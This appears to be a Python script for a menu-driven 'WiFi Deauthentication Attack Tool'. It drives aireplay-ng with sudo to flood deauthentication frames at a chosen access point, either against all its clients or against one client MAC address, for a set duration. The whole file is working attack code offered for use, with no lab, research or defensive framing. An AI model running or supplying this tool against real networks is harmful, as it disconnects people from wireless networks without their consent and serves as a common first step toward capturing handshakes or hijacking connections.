import subprocess
import time
import threading
import os
from termcolor import colored
from functions import (
    get_saved_interface_info, get_saved_network_info, print_header
)
import shutil

def deauth_attack(interface, ap, target=None, duration=10):
    
    """
    Perform a deauthentication attack on a target access point or client
    
    Args:
        interface: Wireless interface in monitor mode
        ap: MAC address of the target access point
        target: MAC address of the specific client (optional)
        duration: Duration of the attack in seconds
    """
    print(colored("[+] Starting deauthentication attack...", 'yellow'))
    try:
        if not interface or not ap:
            print(colored("[!] Interface and AP MAC address are required!", 'red'))
            return False
            
        try:
            result = subprocess.run(["ifconfig", interface], capture_output=True, text=True)
            if result.returncode != 0:
                print(colored(f"[!] Interface {interface} does not exist!", 'red'))
                return False
        except Exception:
            print(colored(f"[!] Cannot verify if interface {interface} exists. Continuing anyway...", 'yellow'))
            
        print(colored(f"\n[+] Starting deauth attack for {duration} seconds on:", 'yellow'))
        print(colored(" Access Point:","cyan"),ap)
        if target:
            print(colored(" Target Client:", "cyan"), target)
        else:
            print(colored(" Target:", "cyan")+ " All connected clients")
        print(colored(" Interface:","cyan"), interface)
        
        cmd = ["sudo", "aireplay-ng", "--ignore-negative-one", "--deauth", "0", "-a", ap]
        
        if target:
            cmd.extend(["-c", target])
            
        cmd.append(interface)
        
        try:
            terminal_width = shutil.get_terminal_size().columns
        except Exception:
            terminal_width = 60

        print(colored(f"\n[+] Executing: {' '.join(cmd)}", 'yellow'))
        print(colored(f"[+] Attack will run for {duration} seconds...", 'yellow'))
        print(colored(f"[+] Displaying aireplay-ng output in real-time...", 'yellow'))
        print(colored("-" * terminal_width, 'blue'))
        
        subprocess.run(["sudo", "-v"])
        
        process = subprocess.Popen(cmd)
        
        def kill_after_duration():
            time.sleep(duration)
            if process.poll() is None:  
                print(colored("\n[+] Time's up! Stopping attack...", 'yellow'))
                process.terminate()
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    process.kill()
        
        timer = threading.Thread(target=kill_after_duration)
        timer.daemon = True  
        timer.start()
        
        try:
            process.wait()
        except KeyboardInterrupt:
            print(colored("\n[+] Deauthentication attack stopped by user.", 'yellow'))
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
                
    except Exception as e:
        print(colored(f"\n[!] Error during attack: {e}", 'red'))
        return False
        
    finally:
        print(colored("\n[+] Attack finished.", 'green'))

    return True 


def get_interface_for_injection():
    """
    Get the appropriate interface for injection.
    Returns the injection interface as first priority.
    """
    interface_info = get_saved_interface_info()
    
    if isinstance(interface_info, tuple) and len(interface_info) > 1 and interface_info[1]:
        return interface_info[1]
    elif isinstance(interface_info, tuple) and len(interface_info) > 0 and interface_info[0]:
        return interface_info[0]
    elif isinstance(interface_info, str):
        return interface_info
    else:
        return None


def main():
    """Main function to handle user input and execute the attack"""
    try:
        term_width = shutil.get_terminal_size().columns
    except Exception:
        term_width = 80
        
    while True:
        try:
            os.system('clear' if os.name == 'posix' else 'cls')
            print_header("WiFi Deauthentication Attack Tool", "blue")

            print_header("MAIN MENU", "yellow", char="-")
            
            menu_options = [
                f"{colored('[1]', 'yellow', attrs=['bold'])} Run deauthentication attack",
                f"{colored('[2]', 'yellow', attrs=['bold'])} Check monitor mode interface",
                f"{colored('[Q]', 'yellow', attrs=['bold'])} Quit"
            ]
            
            max_option_length = max(len(option) for option in menu_options)
            padding = (term_width - max_option_length) // 2
            
            for option in menu_options:
                print(" " * padding + colored(option, "cyan"))
            
            print(colored("-" * term_width, "yellow"))
            
            choice = input(colored("\n[?] Choose an option (1-3 or Q): ", "cyan")).strip()
            
            if choice == "1":
                interface = get_interface_for_injection()
                
                network_info = get_saved_network_info()
                ap = network_info[0] if isinstance(network_info, tuple) else network_info
                
                target_choice = input(colored("\n[?] Deauthenticate (1) all clients or (2) specific client? [1/2]: ", 'cyan'))
                target = None
                if target_choice == "2":
                    target = input(colored("[?] Enter target client MAC address: ", 'cyan'))
                
                duration_input = input(colored("[?] Enter attack duration in seconds [10]: ", 'cyan'))
                try:
                    duration = int(duration_input) if duration_input.strip() else 10
                except ValueError:
                    print(colored("[!] Invalid duration. Using default (10 seconds).", 'yellow'))
                    duration = 10
                
                deauth_attack(interface, ap, target, duration)
                
                try:
                    input(colored("\n[*] Press Enter to return to the menu...", "cyan"))
                except KeyboardInterrupt:
                    pass

            elif choice == "2":
                os.system('clear' if os.name == 'posix' else 'cls')
                print_header("Monitor Mode Interface Check", "blue")
                
                try:
                    result = subprocess.run(["iwconfig"], capture_output=True, text=True)
                    print(colored("\n[+] Available wireless interfaces:", "green"))
                    print(result.stdout)
                except Exception as e:
                    print(colored(f"\n[!] Error checking interfaces: {e}", "red"))
                
                try:
                    input(colored("\n[*] Press Enter to return to the menu...", "cyan"))
                except KeyboardInterrupt:
                    pass

            elif choice.strip().lower() == "q":
                print_header("GOODBYE!", "green")
                print(colored("\n[*] Exiting the WiFi Deauthentication Tool. Goodbye!", "green"))
                input("Press Enter to return to the menu...")
                break
                
            else:
                print(colored("\n[!] Invalid option. Please try again.", "red"))
                time.sleep(1)
                
        except KeyboardInterrupt:
            continue
        except Exception as e:
            print(colored(f"\n[!] An unexpected error occurred: {e}", "red"))
            break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\n\n[!] Program terminated by user.", 'yellow'))
    except Exception as e:
        print(colored(f"\n[!] An unexpected error occurred: {e}", 'red'))
    finally:
        print(colored("\nGoodbye!", 'green'))